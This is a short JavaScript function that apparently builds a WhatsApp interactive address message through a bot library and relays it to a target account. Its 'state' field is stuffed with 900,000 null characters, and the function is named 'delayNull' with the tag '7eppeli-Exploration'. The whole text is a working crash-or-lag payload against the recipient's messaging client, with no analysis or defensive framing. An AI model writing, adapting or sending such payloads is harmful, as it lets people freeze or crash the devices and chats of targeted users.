async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "D | 7eppeli-Exploration",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await Yuukey.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}